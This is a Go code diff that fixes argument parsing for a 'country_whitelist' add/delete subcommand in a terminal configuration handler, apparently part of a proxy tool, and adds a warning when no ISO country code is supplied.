@@ -221,18 +221,19 @@ func (t *Terminal) handleConfig(args []string) error {
 			}
 			t.cfg.SetRedirectUrl(args[1])
 			return nil
-			case "country_whitelist":
-				if len(args) == 4 {
-					switch args[1]{
-					case "add":
-						t.p.wl.AddCountry(args[3])
-						return nil
-					case "delete":
-						t.p.wl.DeleteCountry(args[3])
-						return nil
-					}
+		case "country_whitelist":
+			if len(args) == 3 {
+				switch args[1]{
+				case "add":
+					t.p.wl.AddCountry(args[2])
+					return nil
+				case "delete":
+					t.p.wl.DeleteCountry(args[2])
+					return nil
 				}
-				return nil
+			}
+			log.Warning("you need to specify an ISOCode")
+			return nil
 		}
 	}
 	return fmt.Errorf("invalid syntax: %s", args)
